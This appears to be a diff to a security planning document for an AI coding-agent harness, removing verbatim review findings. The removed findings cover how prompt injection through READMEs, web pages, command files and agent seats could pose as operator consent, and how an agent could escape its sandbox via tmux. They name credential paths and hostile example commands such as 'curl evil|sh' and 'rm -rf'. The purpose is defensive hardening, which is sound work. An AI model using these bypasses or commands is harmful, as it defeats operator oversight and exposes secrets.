@@ -287,46 +287,11 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - I65: the MCP part (`an_mcp_server_endless_line_is_dropped`) is B14, R334.
 - I66: the head does not ask for a Resync after an Unreadable line (P1-F10, low), so it moves to R344. `SINCE` was filled from the bump history in `protocol/tests.rs`. An undocumented variant added without a bump, as `Speaker::Peer` was, is caught only by R321's two-build job. No bump test yet refuses a new wire variant without a `SINCE` row (AGENTS.md rule), so that test moves to R321.
 
-**Scope.** `sessionlog` (`wire.rs`, `server.rs`, `compat.rs`, `peer.rs`), `room/src/client.rs`. I65 sessionlog and room parts (the MCP part is B14, R334). I66 snapshot translation and the per-variant `since` table, floor computed from it (decision 5). I5 cheap part only: any `/letibot.` prefix, an unreadable cgroup is inside. The masked operator socket is R338.
-
 **Proving tests.** `an_overlong_first_frame_is_refused_not_buffered`, `old_head_hello_snapshot_decodes_with_peer_speaker`, `a_peer_in_another_daemons_cgroup_is_inside`. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I65. Frame readers have no length bound
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/wire.rs:59-75`; `sessionlog/src/server.rs:695-752`; `room/src/client.rs:593-605`; compare `room/src/server.rs:4987-5002`. The same pattern is in `mcp/src/wire.rs:95-103,346-357` (A10-F7, medium).
-- Claim: `FrameReader::read` calls `read_line` into an unbounded `String`, and the first frame is read before the inside-peer check. The room client is unbounded too, while the room server caps with `take(MAX_FRAME_BYTES+1)`. The MCP stdio reader uses `lines()` with no cap into an unbounded channel, and the SSE data buffer is unbounded.
-- Scenario: an inside peer (reachable by design for askpass) or an MCP server writes gigabytes with no newline. harnessd is OOM-killed, and every session it serves dies with it.
-- Change: bounded `take(MAX_FRAME_BYTES+1).read_until` in `FrameReader` and in the room client, with a Bye that names the limit. Cap MCP line length, use a bounded channel, and drop the server when the cap is exceeded.
-- Sources: P1-F1, A10-F7. P1 all positions, DeepSeek (supplementary), A10 r1 fable, A10 r2 DeepSeek, A10 r2 sonnet.
-- Test: `an_overlong_first_frame_is_refused_not_buffered` in `sessionlog/tests/late_head.rs` (64 MiB, no newline, Err or Bye within a deadline). `an_mcp_server_endless_line_is_dropped`. Both fail today.
-
-### I66. Hello and Resync snapshots are sent raw to older heads
-- Status: VERIFIED, and observed in this review run. Severity: high.
-- Where: `sessionlog/src/server.rs:729-743,2191-2229,2301-2308`; `sessionlog/src/compat.rs:18-84,122,142`; `sessionlog/src/view.rs:16-30,169,185,265`; `transcript/src/lib.rs:49-72`; `sessionlog/src/event.rs:87,275`; `sessionlog/src/client.rs:79-90,1066`; `sessionlog/src/protocol/tests.rs:171-175`.
-- Claim: `compat::OlderHead` translates `TurnEnded` only. Snapshots carry `Speaker::Peer` (added at 74 with no bump, `7ab2f03fd`), `TurnState::Parked` (75) and `TodoBy::Peer` (77), none with a `serde(other)` fallback. An older head fails the whole attach. The daemon accepts any version. `protocol_skew` promises newer frames are "reported and skipped", but Hello is not pumped (P1-F9). After an Unreadable line nobody asks for a Resync (P1-F10, low).
-- Scenario: observed. Bridges at protocol 74 and 70 failed every attach to the 78 daemon with "unknown variant `peer`, expected `operator` or `agent`". The plugin's MCP binary was older than the installed build and nothing restarted it (L30, same family as L24).
-- Change: `compat` owns the snapshot through one function applied at `:2219` and `:2301`. A per-variant `since` table maps or omits each variant: Parked becomes `Interrupted{partial_kept:true}`, `Speaker::Peer` becomes Agent, `TodoBy::Peer` becomes a readable author. Compute OLDEST_HEAD from that table, and below it send a Bye that names both builds (conflict C2). On Unreadable, mark the gap and send Resync. Rewrite the doc at `protocol.rs:12-14` to the accept-and-say rule.
-- Sources: P1-F2, P1-F9, P1-F10, L30. P1 all positions, DeepSeek (supplementary, corrected the carrier).
-- Test: `old_head_hello_snapshot_decodes_with_peer_speaker`. A Peer-speaker row and a Parked turn, attach as protocol 70, and decode the Hello against a frozen pre-75 schema. Fails today.
-
-### I5. "Inside the tree" is judged by ancestry and one daemon's cgroup, while operator doors stay on a visible socket
-- Status: VERIFIED (mechanism). The escape through a foreign parent is HYP until one executed repro. Severity: high.
-- Where: `sessionlog/src/peer.rs:26-52,233-236,250,285-296`; `sessionlog/src/server.rs:708,747-797,1439-1470,2185-2192`; `harnessd/src/harness/opshell.rs:155-167`; `tools/src/exec/confine.rs:687-689,2721-2731`; `tools/src/backend.rs:556-563`.
-- Claim: `inside = descended_from(pid, daemon) || in_daemon_tree`, and the cgroup test matches only `/letibot.<this daemon>.`. A peer judged outside keeps Prompt, Answer, Mode, ModeConsent and the ungated OperatorShell. Three ways out:
-  - daemon A's tool connecting to daemon B's socket;
-  - a process forked by the operator's own tmux server, `systemd-run --user`, `ssh localhost` or macOS `setsid`;
-  - the readable-stat/unreadable-cgroup corner. An unreadable stat is already inside (`peer.rs:233-236`).
-  The wide seat keeps every daemon socket. The tight seat hides them.
-- Scenario: a wide-seat command runs `tmux new -d '...'` against the operator's running tmux server. The new process connects to the daemon socket, sends a `Mode` frame and lifts its own session to allow-all, or runs `! cmd` through OperatorShell. The same reach lets the host sockets (`/run/user/<uid>/bus`, `/tmp/tmux-*`, docker) run a command outside bwrap, where no wide mask applies (A3-F10).
-- Change: now, match any `/letibot.` prefix and treat an unreadable cgroup as inside. Next, serve operator doors on a socket path that is masked in every view, and serve only Askpass and peer frames on the visible path. Make the connection's role (I6) follow the socket it came in on.
-- Sources: P2-F4, A3-F4, A3-F10. P2 r1 GLM (systemd-run), P2 r1 Kimi (setsid plus OperatorShell), P2 r2 opus (unreadable), P2 r2 DeepSeek (cross-daemon), P2 r2 sonnet, A3 r1 sonnet, A3 r2 GLM, A3 r2 fable, A3 r2 Kimi, A3 r1 opus, DeepSeek (supplementary, `scope.rs:944`).
-- Test: Linux `a_peer_in_another_daemons_cgroup_is_inside`. Put a child in `/letibot.<pid+1>.0`, or stub the cgroup reader, and assert `inside(Some(child), root)` is true. Plus `a_process_spawned_by_a_foreign_parent_is_refused_operator_doors`. A long-lived helper outside the tree spawns a child that sends `Prompt` and `Mode`, and the test asserts both are refused. Both fail today.
+**Findings.** I65, I66, I5, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R321 - B1b skew measured: round-trip tests use the current types at both ends
 
@@ -345,24 +310,11 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - What the job reports as notes, today: `Prompt.delivery` is dropped by daemons at 75 and below, so a queued prompt steers (I68, R344). `EditorContext.captured` arrived with no bump and daemons at 77 and below drop it. `sessions[].role` and `status.held_rooms` are unknown at 70.
 - A batch that bumps to 79 must add `tests/wire_golden/v79` (`cargo run -p letibot-sessionlog --example wire_capture -- crates/sessionlog/tests/wire_golden/v79 79`); `this_build_sends_its_own_versions_corpus` refuses the bump without it.
 
-**Scope.** Two-build CI job under `act`, golden frames the previous tag must decode. Counts as a test, so it lands in the stability phase (C19).
-
 **Proving tests.** `wire_golden_frames_from_v78_still_decode_with_same_meaning`, plus the two-build job itself. Each fails on the snapshot.
 
-**Size.** M. **After:** B1 (R320).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I67. Version skew is never measured
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/protocol/tests.rs:6-170,500-541,597-640,939`; `sessionlog/tests/late_head.rs:353-357`; `sessionlog/src/compat.rs:122,142`.
-- Claim: round trips use the current types at both ends. The accounted-for test catches only variant names. The old-build JSON literals are hand-written and predate `delivery`. `late_head` and the compat tests fake the number while sending this build's bytes.
-- Scenario: a field is renamed or retyped, or its meaning changes with no bump (as with I66 and I68). Every test stays green.
-- Change: a two-build CI job under `act`: the previous release tag's head and bridge against this harnessd, and the reverse. Add a corpus of frames emitted by this build that the previous tag's decoder must read, with semantic assertions. A version bump must add a corpus row. Land it after I65.
-- Sources: P1-F5. P1 r1 sonnet, P1 r2 Kimi, accepted by P1 r1 opus, P1 r2 GLM and P1 r2 fable. DeepSeek (supplementary): the old decoder must run over new bytes.
-- Test: `wire_golden_frames_from_v78_still_decode_with_same_meaning`, plus the two-build job.
+**Findings.** I67, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R322 - B2 shadow and grants: the acting rule is never matched to the path, the breaker resets while grants persist
 
@@ -382,62 +334,13 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - The asker's rules are its `cfg.permission`, not the downgraded set its gate holds; a `read` rule is never a tool downgrade, so the two agree for view reads.
 - "the session-grant recording branch ignores `mode.grants`" is I29 (B4, R324 / R339), not B2.
 
-**Scope.** `harnessd/src/shadow/*`, `harnessd/src/grants.rs`, the `tools/src/runtime.rs` note. Automode prerequisite. Decision 3 applied: `answer_reads` defaults off until R316 stage 1 is promoted, and turning it on is the promotion act. Decision 4 applied: the breaker trip is persisted beside the grants and needs an explicit re-arm; queue grants get a TTL or are bound to the reviewer. Roots for shadow reads are derived from the reviewer's repository at ask time, no configured `/build` or `/data` (C8). `evaluate` runs against the reviewer's own rulesets (C7).
-
 **Proving tests.** `acting_rule_must_cover_the_requested_path`, `answer_reads_is_on_...` (`shadow/tests.rs:1459`) inverted to default off, `read_passes_resolves_symlinks_and_refuses_agent_stores`, `breaker_survives_reopen_while_grants_persist`, `a_shadow_grant_note_names_the_shadow`. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R317 (the shadow answers a relayed read, built, de0b555e3 and its branch) is folded here and in R337. Its left items map to I7 and I11 (this row) and I13, I16 (R337).
 
-**Findings, verbatim from the record.**
-
-### I8. The shadow's acting rule is any 8-byte substring of any allow rule, never matched to the path
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/shadow/permission.rs:262-283,340-391,476-482`; `harnessd/src/shadow/verdict.rs:12,480-487`; `config/permission.json`; `tools/src/permission.rs:113`.
-- Claim: `acting_rule` accepts a quote of at least `MIN_QUOTE` (8) bytes that is a substring of any listed Allow rule. Nothing parses it to one Rule, requires permission `read`, or matches the glob against the requested path. `rules_of` keeps Allow rules only, so a Deny is never seen. The shipped `permission.json` holds only bash rules. L16 adds that the rules consulted are the main session's, not the reviewer's.
-- Scenario: the only rule is `bash git status*`. An injected reviewer relays a read of a path outside its view. The shadow answers allow citing "git status", and `grant_ro` is issued as `shadow:<judge>` with no card. The audit row names a rule that does not cover the path.
-- Change: replace `acting_rule` with `letibot_tools::permission::evaluate("read", view::key(path), rulesets)`, which is last-match and sees Deny rules. Act only on Allow, otherwise post the card. The model only labels the card.
-- Sources: P3-F1, P9-F1, L16. P3 and P9, all six positions each, plus DeepSeek (supplementary).
-- Test: `acting_rule_must_cover_the_requested_path`. Rules `["read /build/**"]`, `view_read=/home/dead/proj/secret.txt`, outcome `Allow{rule:"read /build/**"}`: assert judge returns no grant. Second case: rule `bash git status*` with a read. Both fail today. The existing `only_a_listed_rule_on_an_allow_verdict_acts` (`shadow/tests.rs:1479`) never mismatches the path.
-
-### I9. Turning the shadow permission job on also arms acting
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/shadow/config.rs:54-55,84-86,137-141`; `harnessd/src/harness/open.rs:3607-3608`; `harnessd/src/shadow/permission.rs:340-390`.
-- Claim: `answers_reads = is_on(Permission) && !answer_reads_off`, so enabling the job to observe verdicts makes it act unless `answer_reads = false` is set. That contradicts observe-first (`TODO.md:1154`) and R316's operator-decided promotion. R317 chose this default deliberately (`TODO.md:2195`). It is disclosed by `disclose` and a row, so "silently" is overstated.
-- Scenario: the operator turns the job on for a week of evidence. The first relayed read card is granted by the shadow.
-- Change: default `answer_reads` off. Turning it on is the promotion act, recorded per session (decision 3).
-- Sources: P3-F2. P3 r1 DeepSeek, P3 r2 GLM, P3 r2 Kimi, DeepSeek (supplementary).
-- Test: change `answer_reads_is_on_with_the_permission_job_unless_turned_off` (`shadow/tests.rs:1459`) to assert off by default. Add an end-to-end test where only the job is enabled and a relayed read reaches a card.
-
-### I10. The shadow's path guard is a lexical deny-list that misses agent credentials, the store and pseudo-filesystems
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/shadow/guard.rs:134-170`; `tools/src/secrets.rs:37-74`; `tools/src/intent.rs:1554,1571,2298-2300`; `tools/src/view.rs:71-90`; `tools/src/adjudicate.rs:1719`; `harnessd/src/harness/shadow_seat.rs:31`.
-- Claim: `read_passes` is the shadow's only path filter. It checks the lexical path, while the grant is kept at the canonical `view::key`, so a committed symlink to `~/.ssh` binds the target. Its lists miss `~/.claude`, `~/.codex`, `~/.local/share/letibot` (only `keys` is listed), `/proc`, `/dev`, `/sys` and `~/bin/fleet`. `SECRET_FILE_NAMES` matches `credentials` exactly, so `.credentials.json` misses. Home comes from the daemon's `HOME` with `unwrap_or_default`, so `OWN_CONFIG` goes inert under a unit with no HOME (P3-F7, low).
-- Scenario: together with I8, a reviewer relays `~/.claude/.credentials.json`, `/proc/<pid>/environ` or `sessions.db`, and the shadow can grant it with no card.
-- Change: run the check on `view::key(path)`. Refuse `Region::Device` and the agent stores. Then move shadow-granted reads to an allow-list of roots derived from the reviewer's repository: its workspace and sibling worktrees. Per the operator's decision, these are never configured `/build` or `/data` defaults (conflict C9). Reuse the one secret table from I19 instead of a second list.
-- Sources: P3-F3, P9-F2, P3-F5, P3-F7. P3 r1 opus, P3 r2 GLM, P3 r2 Kimi (symlink verified), P9 all positions, DeepSeek (supplementary).
-- Test: `read_passes_resolves_symlinks_and_refuses_agent_stores`. `link -> $home/.ssh`, `/proc/1/environ`, `<home>/.claude/.credentials.json`, `<home>/.codex/auth.json` and `<home>/.local/share/letibot/sessions.db` must all be Err. All return Ok today.
-
-### I11. The shadow breaker resets at restart, while its grants are durable
-- Status: VERIFIED. Severity: high (STALE D4).
-- Where: `harnessd/src/shadow/permission.rs:170-245,414-441`; `harnessd/src/harness/open.rs:3607-3608,2027-2028,4960`; `harnessd/src/grants.rs:160-171,183-211`; `tokencore/src/store/grants.rs:1-3,75`.
-- Claim: `Answering` (on, disagreements, granted shapes) is process memory, rebuilt at every open. The grants it made are `session_grant` rows rebound at open by `kept_views`, with the why-text "granted earlier in this session, from a card". A reopen re-arms the judge with a full budget and forgets which shapes it granted, so a later No to the same shape is not counted. Only revokes or a No on a seen card count, so silent wrong grants never trip it. The reset is the advertised design ("until restart"), and `/permissions` marks the rows `(by shadow:...)`.
-- Scenario: two revokes trip the breaker. A routine reaper or deploy restart re-arms it over the same grants.
-- Change: persist the trip and the count beside the grants and read them at open. Require an explicit operator re-arm. Rebuild `granted` from the shadow grants at open, or drop shadow grants at open with a row. Queue grants get a TTL or a reviewer or worktree binding (decision 4).
-- Sources: STALE-F4, P3-F4, P9-F5, L16. STALE r1 GLM, STALE r1 Kimi, STALE r1 fable (low), STALE r2 DeepSeek (low), P3 and P9 all positions.
-- Test: `breaker_survives_reopen_while_grants_persist` in `harnessd/src/grants/tests.rs`. Trip with two disagreements, reopen, and assert the breaker is still off and the shadow-granted row is listed as such. Fails today.
-
-### I7. Shadow-granted reads tell the reviewer "by your answer"
-- Status: VERIFIED by the integrator's read: `tools/src/runtime.rs:2418-2423` picks "by your answer" for every `ViewGrant::Granted` and never reads `by`. Severity: medium.
-- Where: `tools/src/runtime.rs:2418-2425`.
-- Claim: the store records `by: shadow:<judge>`, but the note the reviewer model reads says a person answered.
-- Scenario: the reviewer relies on the read, or quotes it, as the operator's approval.
-- Change: thread the answer's `by` into `grant_into_view`'s note and word shadow grants as such.
-- Sources: P3-F6, L17. P3 r1 DeepSeek, P3 r2 GLM.
-- Test: `a_shadow_grant_note_names_the_shadow`. Drive a relayed read answered by the shadow and assert the tool note does not contain "by your answer".
+**Findings.** I8, I9, I10, I11, I7, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R323 - B3 provenance: anything without a speaker label counts as the operator
 
@@ -458,51 +361,11 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - `EditorContext.captured` is a defaulted field with no protocol bump: an older daemon drops the page instead of storing it as the operator's.
 - Rows stored before the speaker field still deserialize as Operator (I6). `httphead.rs` writes Operator rows into a scratch transcript that has no trail.
 
-**Scope.** `harnessd/src/harness/children.rs`, `turns.rs` (`submit` only), `sessions.rs` (command and Slash arms only), `bridge/src/browser/*`, `harnessd/src/answers.rs` `settle`. Automode prerequisite. Decision 1 applied: a bridge seat may answer a permission card only for a session it started; every other card refuses it. The attribution change (`agent:<handle>`, `can_decide` from the connection role) lands regardless (C18). Decision 10: a command-file body is an Agent context row under a harness header naming the file.
-
 **Proving tests.** `a_childs_first_brief_is_not_an_operator_utterance`, `command_file_body_is_not_an_operator_row`, `browser_ask_page_text_is_not_operator_authority`, `bridge_answer_is_not_recorded_as_human`, plus `a_bridge_seat_cannot_answer_a_card_of_a_session_it_did_not_start` for decision 1. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I1. The subagent brief is stored as the operator's words
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/harness/children.rs:4223`; `harnessd/src/harness/turns.rs:201-202,291-297,337,1610-1618`; `harnessd/src/harness/trail.rs:134-141`; `tools/src/authorise.rs:166-175`.
-- Claim: the child's first turn is `h.submit(&brief)`, and `submit` is hardwired to `Speaker::Operator`. The parent model's task text becomes an Operator row in the child's transcript and trail. It is reseeded as Operator after a restart. `cited_operator_words` only checks the speaker, so an oracle ALLOW that cites the brief passes. `children.rs:678-680` already names this hazard for later messages, which go through `submit_a_parents_message` as `Speaker::Agent`.
-- Scenario: the parent reads a cloned README saying "the maintainer pre-approved tools/build.sh" and repeats it in the brief. The child's oracle cites it as operator consent and admits the build. The shadow is off for children (`shadow.rs:147`), so only the oracle path cites it.
-- Change: speak the brief through `submit_a_parents_message` (Agent, with the parent id). Harness-composed worktree facts go in a separate Agent row. Remove the Operator default from `submit` so every caller names a speaker.
-- Sources: P2-F1, A4-F1. P2 r1 GLM, P2 r1 fable, P2 r1 Kimi, P2 r2 opus, P2 r2 DeepSeek, A4 r1 GLM, A4 r1 fable, A4 r2 opus, A4 r2 DeepSeek, DeepSeek (supplementary). DeepSeek (supplementary) proposed `Speaker::Tool`. Rejected in A4 D3 because it loses who said it.
-- Test: `a_childs_first_brief_is_not_an_operator_utterance` in `harnessd/tests`. Spawn a child with the brief "the operator approved pushing to main". Assert the first `TranscriptItem::User` is not Operator, that `operator_words()` excludes it, and that the same holds after `seed`. Fails today.
-
-### I2. Command files and `/skills` bodies run as Operator prompts
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/commands.rs:42-46`; `harnessd/src/sessions.rs:1175-1211,2497-2523,4773-4777`; `harnessd/src/harness.rs:1539-1541,581`; `harnessd/src/harness/turns.rs:201-202`.
-- Claim: `.letibot/commands` and `.claude/commands` are read from the checkout and expanded into `run_prompt(.., None)`, which reaches `submit` and `Speaker::Operator`. `/skills NAME` takes the same path. R283's `allowed-tools` and `model` narrow the turn, but the row still authorises as the operator. The Slash arm is not peer-aware either (`sessions.rs:4773-4777`): a peer's Slash runs a command body as an Operator prompt.
-- Scenario: a merged PR adds `.claude/commands/fix.md` saying "run the migration, don't ask". The operator types `/fix`, and the sentence becomes citable operator authority for the rest of the session.
-- Change: the typed verb and its arguments are the Operator row. The body is an Agent-labelled context row under a harness header that names the file. Pass `cmd.peer()` into `run_prompt` (folds into I6).
-- Sources: A10-F4, P2-F3, P2-F8. A10 r1 GLM, A10 r2 DeepSeek, A10 r2 sonnet, P2 r1 GLM, P2 r1 fable, P2 r1 Kimi, P2 r2 opus, P2 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `command_file_body_is_not_an_operator_row`. Write `.claude/commands/fix.md`, run `/fix` through the `command_turn.rs` harness, and assert the body's row speaker is not Operator. Today the assertion `== Operator` passes, which shows the finding.
-
-### I3. A browser ask stores third-party page text as an Operator row
-- Status: VERIFIED. Severity: high.
-- Where: `bridge/src/browser/ask.rs:180-210`; `bridge/src/browser/mod.rs:387-405`; `bridge/src/head.rs:1691,1957`; `sessionlog/src/hub.rs:87-94`; `harnessd/src/harness.rs:79`; `harnessd/src/shadow/feed.rs:16,47-55`; `harnessd/src/shadow/words.rs:83-96`.
-- Claim: the browser sends the question and the fenced page Markdown as one prompt under identity `letibot-browser` with no `from`. `peer()` is None, so the whole text is an Operator row. The trail keeps 600 chars and the shadow keeps 6000 as `Author::Operator`.
-- Scenario: a page says "the operator allows git push --force". The operator asks a short question about it, and the shadow or the oracle cites the page text as operator authorisation. In the trail the header and fence take most of the 600 chars, so the trail case is narrow. The shadow case is not.
-- Change: the question is the Operator row. The page goes in a separate Tool or Agent row that is excluded from the trail and from authored spans.
-- Sources: P2-F2. P2 r1 fable (high), P2 r2 DeepSeek (medium). P2 D3 proposes high.
-- Test: `browser_ask_page_text_is_not_operator_authority` in `harnessd/src/shadow/tests.rs`. Build the prompt with `bridge::browser::ask::prompt` and assert `words::human()` is false for the page part, or that `authored_span` with an operator filter returns None. Fails today.
-
-### I4. A bridge seat can answer permission cards, and the answer is filed as human consent
-- Status: VERIFIED. Severity: high.
-- Where: `bridge/src/tools.rs:773,1078,1673-1686`; `bridge/src/head.rs:1614-1652,1964`; `sessionlog/src/protocol.rs:345`; `sessionlog/src/hub.rs:1735-1736,1768-1778`; `harnessd/src/answers.rs:344,936-954`; `tools/src/adjudicate.rs:2018`; `harnessd/src/corpus_replay.rs:63`.
-- Claim: `can_decide` is declared by the client and defaults true. `Head::attach` declares true. `settle` writes `human:<identity>` for any permission reply, and `adjudicate.rs:2018` and corpus replay read `human:` as "a person saw it".
-- Scenario: prompt injection in a repo makes a Claude Code seat call `leticode_asks` and then `leticode_answer allow_session` on a child's card. The gated command runs, and the corpus records human consent.
-- Change: write `by = agent:<handle>` for non-head identities and set `by_a_person` false for them. Derive `can_decide` from the connection role (I6), not from `Caps`. Whether a seat may answer permission cards at all is the operator's call (decision 1).
-- Sources: P2-F6. P2 r1 Kimi (critical), DeepSeek (supplementary, critical), P2 r1 fable (medium), P2 r2 DeepSeek (low). P2 D2 proposes high.
-- Test: `bridge_answer_is_not_recorded_as_human`. Answer a card through `Bridge::answer` with `allow_session`. Assert the settled `AdjudicationDecision.by` is not `human:*` and that the refusal text does not claim the operator saw it. Fails today. The nearest existing test, `bridge/tests/end_to_end.rs:512`, asserts neither.
+**Findings.** I1, I2, I3, I4, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R324 - B4 gate rules: approved shapes admit any body, seed rows admit write and exec flags, own-config by substring, Absent never refused
 
@@ -525,72 +388,17 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - I29: the session-grant recording branch still ignores `mode.grants` (R339). Shapes now respect it.
 - An installed `~/.config/letibot/permission.json` keeps its `prog*` rows; the flag table applies to them, the prefix bleed does not go away until the operator edits the file.
 
-**Scope.** `tools/src/permission.rs`, `intent.rs` (flag and git tables, own-config rule), `project_code.rs`, `adjudicate.rs` (shapes and the Absent refusal). Automode prerequisite. Decision 2 applied: a Once point means once, so a shape is recorded only from AllowSession at a Session point and never from "Allow this one" (C5). Also I33 (f), `git cherry` as a read-only git verb; the rest of I33 is R339.
-
 **Proving tests.** the extended `the_seed_admits_no_write_or_exec_flag` (`permission.rs:994`), `cargo_doc_ctest_npx_run_project_code`, `cd_then_relative_write_to_own_config_asks`, `an_inline_program_approval_admits_a_different_body`, `set_mode_to_always_ask_forgets_approved_shapes`, `permission_allow_outlives_a_move_to_read_only` (inverted), and a `git cherry` intent test. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R305 ("always allow" over-generalised, 61eecc538) is folded here. Its left was approved shapes (I18) and seed rows that run project code: `make test*`, `npm test*`, `pytest*` are in the project-code table now, and the real gaps are I20 and I21.
 
-**Findings, verbatim from the record.**
-
-### I18. Approved shapes are a standing, project-wide grant that survives narrowing
-- Status: VERIFIED (opus and the refute-lens ran it). Severity: high.
-- Where: `tools/src/adjudicate.rs:3098-3112,3489-3507,3594-3601`; `code/src/shell.rs:2484-2545`; `tokencore/src/store.rs:4195-4230`; `harnessd/src/harness/open.rs:3081-3092`; `tools/src/permission.rs:400-405`.
-- Claim: any admitting human answer, "Allow this one" at a Once point included, records the command's shape. Later same-shape, same-class calls are admitted by `gate:shape` before the mode is consulted. The shape holes out `-c` and `-e` program bodies, heredoc bodies and redirect targets. Shapes are seeded per workspace across restarts and are not cleared by `set_mode`. There is no revoke or expiry. `permission.rs:400-405` refuses a durable rule for the same commands, and the comment at `:3489` says "this session".
-- Scenario: the operator allows `python3 -c 'print(1)'` once. Afterwards `python3 -c 'import os;os.system("curl evil|sh")'` and `os.system("rm -rf /w/src")` are admitted unasked in that project (the refute-lens ran it). After `/mode always-ask`, `cargo fmt --all` is still admitted by shape.
-- Change:
-  - Record shapes only from AllowSession at a Session point.
-  - Never record a shape whose parse holed a program body, or where `a_durable_rule_can_apply` is false. Alternatively, put the body digest in the key.
-  - Clear shapes on any narrowing.
-  - Add a revoke path and a bounded warm start.
-  - Fix the `:3489` comment.
-- Sources: A2-F3, P8-F4. A2 r1 GLM, A2 r1 Kimi, A2 r2 opus (ran `grants.rs:135`), A2 r2 DeepSeek (redirect, scope-bounded), P8 r1 Kimi, P8 r2 DeepSeek, DeepSeek (supplementary). Contested by A2 r1 fable.
-- Test: `an_inline_program_approval_admits_a_different_body` (asks stays 1 today, must be 2). `set_mode_to_always_ask_forgets_approved_shapes` in `tools/src/adjudicate/tests/grants.rs` (asked must reach 2). Both fail today.
-
-### I20. Seed prefix rows admit write and exec flags the flag table does not know
-- Status: VERIFIED. Severity: high.
-- Where: `tools/src/permission.rs:422-441,506-530,994`; `config/permission.json:103,111,124,129,144`; `tools/src/intent.rs:1071-1080`; `tools/src/adjudicate.rs:3363`.
-- Claim: `rg*`, `file*`, `uniq*`, `xxd*`, `less*` and `ugrep*` allow rows are narrowed only when `write_or_exec_flag` finds a flag. That function knows sed, sort, git grep/diff/log/show, `tree -o` and `xxd -r`. Everything else falls to `None`. The intent table classes these programs as read or inspect, so `gate:permission` admits.
-- Scenario: `rg --pre ./x.sh pat .` runs `./x.sh` per file. `uniq payload ~/.config/autostart/x.desktop`, `xxd IN OUT`, `less -o F` and `file -C -m x` all write. All are admitted with no card.
-- Change: add rows for `rg --pre/--pre-glob`, `uniq`/`xxd` output operands, `less -o`, `file -C` and `ugrep --filter`. Make the seed test iterate every seed row against a per-program write/exec fixture, so a new row without a fixture fails. Follow-up: one read-only-interface table shared by the seed check and the intent table.
-- Sources: A2-F1. A2 r1 fable, A2 r1 Kimi, A2 r2 opus, A2 r2 DeepSeek, A2 r2 sonnet, DeepSeek (supplementary).
-- Test: add the five commands to `the_seed_admits_no_write_or_exec_flag` (`permission.rs:994`) asserting `Action::Ask`. All return Allow today.
-
-### I21. Seed runner rows run project code the project-code table does not list
-- Status: VERIFIED. Severity: high on a host with no boundary.
-- Where: `tools/src/project_code.rs:101-152`; `config/permission.json:65,90,91,96`; `tools/src/adjudicate.rs:2078-2094,3195,3363`; `tools/src/intent.rs:1230,3006-3016`.
-- Claim: `cargo doc*`, `npx vitest*`, `npx jest*` and `ctest*` run project code (`build.rs`, proc macros, configs), but `subcommand_that_runs_code` lists no `doc`, `npx` or `ctest`, and recognises python only for `-m`. With no boundary, `runs_project_code_unconfined` is None and the seed allow admits. The open HYP that npx's Network intent still asks does not hold: the unseen-host ask needs a named remote host.
-- Scenario: on a Mac or a box with broken bwrap, `cargo doc` runs the repo's `build.rs` unasked.
-- Change: add `doc`, `npx`/`npm exec` and `ctest`. Add a test that every seeded runner program is judged by the table, or key the withdrawal on `ExecuteCode` in the baseline intents.
-- Sources: A2-F2. A2 r1 GLM, A2 r2 opus, A2 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `cargo_doc_ctest_npx_run_project_code` (Some for each), plus `no_boundary_cargo_doc_asks`. Fails today.
-
-### I22. The gate's own-config rule is a substring of the command text
-- Status: VERIFIED (code read, not run). Severity: high at a Model-decider point.
-- Where: `tools/src/intent.rs:2227-2238,2802-2817,2962-2975,3537-3541,1554`; `tools/src/adjudicate.rs:3558`; mitigation `exec/seatbelt.rs:90`, `exec/seat.rs:461`.
-- Claim: `touches_own_config` looks for `letibot/<file>` in the target text and the source. `cd` updates only the region, not the scoped target. So `cd ~/.config/letibot && cp ./x permission.json` fires no always-ask and stays MayApprove. The seat mask covers `~/.config/letibot` except under Unconfined.
-- Change: compare resolved targets with `under()` against the config directory, and treat the directory as a store in the one secret table (I19).
-- Sources: A2-F9. A2 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `cd_then_relative_write_to_own_config_asks` asserting rule `changes_its_own_rules`. Fails today.
-
-### I23. After `/mode read-only` the gate asks instead of refusing, and a permission allow still admits
-- Status: VERIFIED. Severity: high.
